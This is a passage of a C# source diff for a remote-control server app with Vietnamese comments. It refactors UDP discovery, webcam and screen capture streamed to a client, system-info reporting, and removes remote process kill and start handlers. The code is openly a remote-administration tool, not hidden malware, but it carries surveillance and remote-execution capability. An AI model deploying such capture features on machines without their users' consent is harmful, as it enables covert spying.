+                            // Chọn IP đầu tiên (hoặc có thể chọn IP trong cùng subnet với sender)
+                            string serverIp = ipv4Addresses.FirstOrDefault()?.ToString() ?? "Unknown";
 
-                        SendData(filteredList.Count.ToString());
+                            // === TẠO RESPONSE MESSAGE ===
 
-                        foreach (Process p in filteredList)
-                        {
-                            string name = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
-                            SendData(name);
-                            SendData(p.Id.ToString());
-                            SendData(p.Threads.Count.ToString());
+                            // --- LOGIC MỚI: KIỂM TRA TRẠNG THÁI ---
+                            string status = isClientConnected ? "BUSY" : "READY";
+                            // Format: "HOSTNAME|IP_ADDRESS|STATUS"
+                            string response = $"{hostname}|{serverIp}|{status}";
+
+                            // Encode string → bytes
+                            byte[] responseData = Encoding.UTF8.GetBytes(response);
+                            
+                            // GỬI RESPONSE LẠI CHO SENDER
+                            // Send đến IP và Port của sender (Python Web Server)
+                            udpServer.Send(responseData, responseData.Length, remoteEndpoint);
+                            
+                            Console.WriteLine($"[UDP Discovery] Sent response: {response}");
                         }
                     }
-                    catch { SendData("0"); }
-                }
-                else if (cmd == "KILL")
-                {
-                    if (ReceiveCommand(out cmd) && cmd == "KILLID")
+                    catch (Exception ex)
                     {
-                        string idStr = "";
-                        if (ReceiveCommand(out idStr))
-                        {
-                            try
-                            {
-                                Process.GetProcessById(int.Parse(idStr)).Kill();
-                                SendData($"Successfully killed ID: {idStr}");
-                            }
-                            catch (Exception ex) { SendData("Failed: " + ex.Message); }
-                        }
+                        // Log lỗi nhưng không crash thread
+                        Console.WriteLine($"[UDP Discovery] Error handling request: {ex.Message}");
                     }
                 }
-                else if (cmd == "START")
+            }
+            catch (Exception ex)
+            {
+                // Lỗi khi bind port (ví dụ port đã bị sử dụng)
+                Console.WriteLine($"[UDP Discovery] Fatal error: {ex.Message}");
+                MessageBox.Show($"UDP Discovery Error: {ex.Message}\nPort 9999 may be in use.", 
+                               "UDP Discovery Error", 
+                               MessageBoxButtons.OK, 
+                               MessageBoxIcon.Error);
+            }
+            finally
+            {
+                // Cleanup
+                if (udpServer != null)
                 {
-                    if (ReceiveCommand(out cmd) && cmd == "STARTID")
-                    {
-                        string name = "";
-                        if (ReceiveCommand(out name))
-                        {
-                            try
-                            {
-                                Process.Start(name);
-                                SendData("Successfully started: " + name);
-                            }
-                            catch (Exception ex) { SendData("Failed: " + ex.Message); }
-                        }
-                    }
+                    udpServer.Close();
+                    udpServer = null;
                 }
             }
         }
 
-        #endregion
-
-        #region --- Module: Webcam ---
-
-        public void WebcamModule()
+        // ==================== MODULE WEBCAM ====================
+        /// <summary>
+        /// Handler cho WEBCAM module
+        /// Commands: ON, OFF, GET_FRAME, START_REC, STOP_REC, STATUS, GET_VIDEO, QUIT
+        /// Architecture: Camera ON/OFF riêng biệt với Recording START/STOP
+        /// </summary>
+        public void webcam()
         {
-            string cmd = "";
-            if (webcamCapture == null) webcamCapture = new WebcamRecorder.WebcamCapture();
+            String cmd = "";
+            
+            // Khởi tạo webcam instance nếu chưa có
+            if (webcamCapture == null)
+            {
+                webcamCapture = new WebcamRecorder.WebcamCapture();
+            }
 
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
-
+                receiveSignal(ref cmd);
+                
                 switch (cmd)
                 {
-                    case "WEBCAM": break; // Sync check
-                    case "ON": SendData(webcamCapture.TurnOn()); break;
-                    case "OFF": SendData(webcamCapture.TurnOff()); break;
-                    case "START_REC": SendData(webcamCapture.StartRecording()); break;
-                    case "STATUS": SendData(webcamCapture.GetStatus()); break;
-                    case "CLEAR": SendData(webcamCapture.ClearAllRecordings()); break;
 
-                    case "GET_FRAME":
-                        SendBytes(webcamCapture.GetCurrentFrameAsJpeg());
+                    case "WEBCAM":
+                        // Nếu nhận được lệnh "WEBCAM" khi đang ở trong vòng lặp này,
+                        // nghĩa là Client gửi kèm định danh module. 
+                        // Ta chỉ cần bỏ qua để vòng lặp đọc lệnh tiếp theo (VD: GET_FRAME).
                         break;
 
-                    case "STOP_REC":
-                        string stopRes = webcamCapture.StopRecording();
-                        SendData(stopRes);
-                        if (stopRes.StartsWith("RECORDING_STOPPED"))
+                    case "ON": // Bật camera (chỉ preview, chưa ghi)
                         {
-                            string[] parts = stopRes.Split('|');
-                            if (parts.Length >= 2) SendLargeFile(webcamCapture.GetVideoBytes(parts[1]));
-                            else SendData("0");
+                            string result = webcamCapture.TurnOn();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
                         }
-                        break;
 
-                    case "GET_VIDEO":
-                        if (ReceiveCommand(out string filename))
-                            SendLargeFile(webcamCapture.GetVideoBytes(filename));
-                        break;
+                    case "OFF": // Tắt camera
+                        {
+                            string result = webcamCapture.TurnOff();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
 
-                    case "QUIT": return;
+                    case "GET_FRAME": // Lấy 1 frame hiện tại (cho streaming)
+                        {
+                            byte[] frameBytes = webcamCapture.GetCurrentFrameAsJpeg();
+                            
+                            if (frameBytes != null && frameBytes.Length > 0)
+                            {
+                                // Gửi size trước, sau đó gửi bytes
+                                Program.nw.WriteLine(frameBytes.Length.ToString());
+                                Program.nw.Flush();
+                                Program.client.Send(frameBytes);
+                            }
+                            else
+                            {
+                                // Không có frame
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "START_REC": // Bắt đầu recording
+                        {
+                            string result = webcamCapture.StartRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "STOP_REC": // Dừng recording, gửi video về Python
+                        {
+                            string result = webcamCapture.StopRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            
+                            // Nếu stop thành công, gửi file video
+                            if (result.StartsWith("RECORDING_STOPPED"))
+                            {
+                                string[] parts = result.Split('|');
+                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
+                                {
+                                    string filename = parts[1];
+                                    byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
+                                    
+                                    if (videoBytes != null && videoBytes.Length > 0)
+                                    {
+                                        // Gửi size
+                                        Program.nw.WriteLine(videoBytes.Length.ToString());
+                                        Program.nw.Flush();
+                                        
+                                        // Gửi bytes (chia nhỏ chunks nếu file lớn)
+                                        int chunkSize = 1024 * 1024; // 1 MB chunks
+                                        int offset = 0;
+                                        while (offset < videoBytes.Length)
+                                        {
+                                            int remaining = videoBytes.Length - offset;
+                                            int currentChunkSize = Math.Min(chunkSize, remaining);
+                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                            offset += currentChunkSize;
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Program.nw.WriteLine("0");
+                                        Program.nw.Flush();
+                                    }
+                                }
+                            }
+                            break;
+                        }
+
+                    case "STATUS": // Kiểm tra trạng thái
+                        {
+                            string status = webcamCapture.GetStatus();
+                            Program.nw.WriteLine(status);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "GET_VIDEO": // Lấy video cụ thể (by filename)
+                        {
+                            string filename = Program.nr.ReadLine();
+                            byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
+                            
+                            if (videoBytes != null && videoBytes.Length > 0)
+                            {
+                                Program.nw.WriteLine(videoBytes.Length.ToString());
+                                Program.nw.Flush();
+                                
+                                // Gửi chunks
+                                int chunkSize = 1024 * 1024;
+                                int offset = 0;
+                                while (offset < videoBytes.Length)
+                                {
+                                    int remaining = videoBytes.Length - offset;
+                                    int currentChunkSize = Math.Min(chunkSize, remaining);
+                                    Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                    offset += currentChunkSize;
+                                }
+                            }
+                            else
+                            {
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "CLEAR": // Xóa tất cả videos
+                        {
+                            string result = webcamCapture.ClearAllRecordings();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "QUIT": // Thoát module
+                        return;
                 }
             }
         }
 
-        #endregion
-
-        #region --- Module: Screen Recording ---
-
-        public void ScreenRecModule()
+        // --- MODULE SCREEN RECORDING (MỚI) ---
+        public void screen_rec()
         {
-            string cmd = "";
-            if (screenCapture == null) screenCapture = new ScreenRecorder.ScreenCapture();
+            String cmd = "";
+
+            // Khởi tạo instance nếu chưa có
+            if (screenCapture == null)
+            {
+                screenCapture = new ScreenRecorder.ScreenCapture();
+            }
 
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
+                receiveSignal(ref cmd);
 
                 switch (cmd)
                 {
-                    case "SCREEN_REC": break;
-                    case "START": SendData(screenCapture.StartStream()); break;
-                    case "STOP": SendData(screenCapture.StopStream()); break;
-                    case "START_REC": SendData(screenCapture.StartRecording()); break;
-                    case "STATUS": SendData(screenCapture.GetStatus()); break;
-
-                    case "GET_FRAME":
-                        SendBytes(screenCapture.GetCurrentFrameAsJpeg());
+                    case "SCREEN_REC":
+                        // Bỏ qua nếu client gửi header lặp lại
                         break;
 
-                    case "STOP_REC":
-                        string stopRes = screenCapture.StopRecording();
-                        SendData(stopRes);
-                        if (stopRes.StartsWith("RECORDING_STOPPED"))
+                    case "START": // Bắt đầu Stream (tương đương ON bên Webcam)
                         {
-                            string[] parts = stopRes.Split('|');
-                            if (parts.Length >= 2) SendLargeFile(screenCapture.GetVideoBytes(parts[1]));
-                            else SendData("0");
+                            string result = screenCapture.StartStream();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
                         }
-                        break;
 
-                    case "QUIT": return;
+                    case "STOP": // Dừng Stream (tương đương OFF bên Webcam)
+                        {
+                            string result = screenCapture.StopStream();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "GET_FRAME": // Lấy 1 frame màn hình (Live view)
+                        {
+                            byte[] frameBytes = screenCapture.GetCurrentFrameAsJpeg();
+
+                            if (frameBytes != null && frameBytes.Length > 0)
+                            {
+                                Program.nw.WriteLine(frameBytes.Length.ToString());
+                                Program.nw.Flush();
+                                Program.client.Send(frameBytes);
+                            }
+                            else
+                            {
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "START_REC": // Bắt đầu ghi file
+                        {
+                            string result = screenCapture.StartRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "STOP_REC": // Dừng ghi và gửi file về
+                        {
+                            string result = screenCapture.StopRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+
+                            if (result.StartsWith("RECORDING_STOPPED"))
+                            {
+                                string[] parts = result.Split('|');
+                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
+                                {
+                                    string filename = parts[1];
+                                    byte[] videoBytes = screenCapture.GetVideoBytes(filename);
+
+                                    if (videoBytes != null && videoBytes.Length > 0)
+                                    {
+                                        Program.nw.WriteLine(videoBytes.Length.ToString());
+                                        Program.nw.Flush();
+
+                                        int chunkSize = 1024 * 1024;
+                                        int offset = 0;
+                                        while (offset < videoBytes.Length)
+                                        {
+                                            int remaining = videoBytes.Length - offset;
+                                            int currentChunkSize = Math.Min(chunkSize, remaining);
+                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                            offset += currentChunkSize;
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Program.nw.WriteLine("0");
+                                        Program.nw.Flush();
+                                    }
+                                }
+                            }
+                            break;
+                        }
+
+                    case "STATUS":
+                        {
+                            string status = screenCapture.GetStatus();
+                            Program.nw.WriteLine(status);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "QUIT": // Thoát module
+                        return;
                 }
             }
         }
 
-        #endregion
-
-        #region --- Helper: Send Bytes & Large Files ---
-
-        // Gửi mảng byte nhỏ (cho Frame ảnh)
-        private void SendBytes(byte[] data)
-        {
-            if (data != null && data.Length > 0)
-            {
-                SendData(data.Length.ToString());
-                try { Program.client.Send(data); } catch { }
-            }
-            else
-            {
-                SendData("0");
-            }
-        }
-
-        // Gửi file lớn (Chunking)
-        private void SendLargeFile(byte[] data)
-        {
-            if (data == null || data.Length == 0)
-            {
-                SendData("0");
-                return;
-            }
-
-            SendData(data.Length.ToString());
-
-            try
-            {
-                int chunkSize = 1024 * 1024; // 1MB
-                int offset = 0;
-                while (offset < data.Length)
-                {
-                    int remaining = data.Length - offset;
-                    int currentSize = Math.Min(chunkSize, remaining);
-                    Program.client.Send(data, offset, currentSize, SocketFlags.None);
-                    offset += currentSize;
-                }
-            }
-            catch { }
-        }
-
-        #endregion
-
-        #region --- Module: System Info (Optimized) ---
-
-        public void SendSystemInfo()
-        {
-            // Chỉ cần gửi chuỗi đã được Timer cập nhật sẵn -> Tốc độ phản hồi cực nhanh
-            SendData(cachedSystemInfo);
-        }
-
-        private void UpdateSystemStats(Object source, ElapsedEventArgs e)
-        {
-            try
-            {
-                float cpu = cpuCounter.NextValue();
-                float ram = ramCounter.NextValue();
-
-                string battery = "Unknown";
-                try
-                {
-                    var pwr = SystemInformation.PowerStatus;
-                    battery = (pwr.BatteryLifePercent * 100) + "%" + (pwr.PowerLineStatus == PowerLineStatus.Online ? " (Plugged)" : "");
-                }
-                catch { }
-
-                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
-                string uptimeStr = $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m";
-
-                // Update biến volatile
-                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}|{uptimeStr}" + staticHardwareInfo;
-            }
-            catch { }
-        }
-
+        // --- MODULE SYSTEM INFO ---
         private string GetHardwareInfo(string table, string property)
         {
             try
             {
-                using (var searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + table))
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + table);
+                foreach (ManagementObject obj in searcher.Get())
                 {
-                    foreach (ManagementObject obj in searcher.Get())
-                    {
-                        return obj[property]?.ToString() ?? "Unknown";
-                    }
+                    return obj[property].ToString(); // Lấy cái đầu tiên tìm thấy
                 }
             }
             catch { }
@@ -746,13 +912,11 @@ namespace ServerApp
         {
             try
             {
-                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
+                foreach (ManagementObject obj in searcher.Get())
                 {
-                    foreach (ManagementObject obj in searcher.Get())
-                    {
-                        long memKb = long.Parse(obj["TotalVisibleMemorySize"].ToString());
-                        return Math.Round((double)memKb / (1024 * 1024), 0) + " GB";
-                    }
+                    long memKb = long.Parse(obj["TotalVisibleMemorySize"].ToString());
+                    return Math.Round((double)memKb / (1024 * 1024), 0).ToString() + " GB";
                 }
             }
             catch { }
@@ -772,52 +936,50 @@ namespace ServerApp
             catch { }
             return "127.0.0.1";
         }
-
-        #endregion
-
-        #region --- UDP Discovery ---
-
-        private void StartUdpDiscoveryListener()
+        private void UpdateSystemStats(Object source, ElapsedEventArgs e)
         {
-            UdpClient udpServer = null;
             try
             {
-                udpServer = new UdpClient(9999);
-                IPEndPoint remoteEndpoint = new IPEndPoint(IPAddress.Any, 0);
+                float cpu = cpuCounter.NextValue();
+                float ram = ramCounter.NextValue();
 
-                while (true)
+                // Lấy Pin
+                String battery = "Unknown";
+                try
                 {
-                    try
-                    {
-                        byte[] receivedData = udpServer.Receive(ref remoteEndpoint);
-                        string message = Encoding.UTF8.GetString(receivedData);
-
-                        if (message.Trim() == "DISCOVER_SERVER")
-                        {
-                            string hostname = Dns.GetHostName();
-                            // Lấy IP của máy mà Client có thể thấy (cố gắng chọn IP LAN)
-                            string serverIp = GetLocalIPAddress();
-                            string status = isClientConnected ? "BUSY" : "READY";
-
-                            string response = $"{hostname}|{serverIp}|{status}";
-                            byte[] responseData = Encoding.UTF8.GetBytes(response);
-
-                            udpServer.Send(responseData, responseData.Length, remoteEndpoint);
-                        }
-                    }
-                    catch { } // Bỏ qua lỗi trong vòng lặp nhận tin
+                    PowerStatus pwr = SystemInformation.PowerStatus;
+                    battery = (pwr.BatteryLifePercent * 100).ToString() + "%";
+                    if (pwr.PowerLineStatus == PowerLineStatus.Online) battery += " (Plugged)";
                 }
+                catch { }
+
+                // Lấy Uptime (Thời gian máy đã chạy) - MỚI
+                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
+                string uptimeStr = string.Format("{0}d {1}h {2}m", uptime.Days, uptime.Hours, uptime.Minutes);
+
+                // Format chuỗi gửi đi: 
+                // Index: 0   | 1  |   2   |   3  |    4   | 5| 6|    7   |    8   |    9
+                // Data : CPU |RAM |Battery|Uptime|Hostname|OS|IP|CpuName |GpuName |TotalRam
+                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}|{uptimeStr}" + staticInfo;
+            }
+            catch { }
+        }
+
+        // --- 4. SỬA HÀM GỬI INFO (send_system_info) ---
+        // Hàm này giờ chỉ việc đọc cache -> Cực nhanh
+        public void send_system_info()
+        {
+            try
+            {
+                // Gửi ngay lập tức dữ liệu đã được Timer chuẩn bị sẵn
+                Program.nw.WriteLine(cachedSystemInfo);
+                Program.nw.Flush();
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"UDP Discovery Error (Port 9999): {ex.Message}");
-            }
-            finally
-            {
-                if (udpServer != null) udpServer.Close();
+                Program.nw.WriteLine("ERROR|" + ex.Message);
+                Program.nw.Flush();
             }
         }
-
-        #endregion
     }
 }
